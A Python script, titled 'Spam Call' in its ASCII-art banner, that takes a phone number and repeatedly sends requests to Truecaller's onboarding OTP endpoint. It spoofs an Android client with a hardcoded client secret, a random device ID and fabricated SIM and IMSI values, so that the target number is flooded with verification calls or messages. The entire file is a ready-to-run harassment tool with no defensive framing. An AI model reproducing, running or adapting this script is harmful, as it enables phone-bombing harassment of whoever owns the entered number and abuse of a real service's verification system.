import requests
import pyfiglet
import hashlib
import random
import time

asa = '123456789'
gigk = str(''.join(random.choice(asa) for i in range(10)))
joo = hashlib.md5(gigk.encode()).hexdigest()[:16]

red_color = '\033[1;31m'
yellow_color = '\033[1;33m'
green_color = '\033[2;32m'
white_color = '\033[1;97m'
blue_color = '\033[1;34m'
light_blue_color = '\033[2;36m'
light_green_color = '\033[1;32m'
light_yellow_color = '\033[1;33m'

ascii_art = pyfiglet.figlet_format("El Jo Net")
j = pyfiglet.figlet_format("Spam Call ")
print(green_color + ascii_art)
print(red_color + j)
print(light_blue_color + "by code: Jo_Ali")
print(blue_color + "By code: Yousef Jo")
print("")
nu = input(green_color + "Enter a number : " + light_blue_color)
print("")
for _ in range(3):
    url3 = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"

    headers3 = {
        "Host": "account-asia-south1.truecaller.com",
        "content-type": "application/json; charset\u003dUTF-8",
        "content-length": "680",
        "accept-encoding": "gzip",
        "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
        "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
    }

    data3 = '{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"'+joo+'","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":"'+nu+'","region":"region-2","sequenceNo":1}'

    r3 = requests.post(url3, headers=headers3, data=data3).text
    print(r3)
    time.sleep(60)
